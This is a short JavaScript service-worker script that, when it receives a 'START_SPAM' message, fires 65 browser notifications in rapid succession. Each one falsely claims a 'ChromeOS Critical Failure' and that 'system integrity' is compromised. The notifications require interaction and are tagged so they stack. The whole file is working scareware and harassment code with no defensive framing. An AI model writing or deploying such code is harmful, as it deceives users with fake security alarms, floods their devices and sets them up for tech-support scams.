self.addEventListener('message', (event) => {
  if (event.data && event.data.type === 'START_SPAM') {
    let count = 0;
    const maxBurst = 65; 
    
    const spammer = setInterval(() => {
      self.registration.showNotification("⚠️ EMERGENCY SYSTEM ALERT #" + (count + 1), {
        body: "ChromeOS Critical Failure: System integrity compromised. Action required.",
        icon: "https://upload.wikimedia.org",
        tag: "spam-" + Date.now() + "-" + count,
        requireInteraction: true,
        vibrate: [200, 100, 200]
      });

      count++;
      if (count >= maxBurst) clearInterval(spammer);
    }, 150); 
  }
});
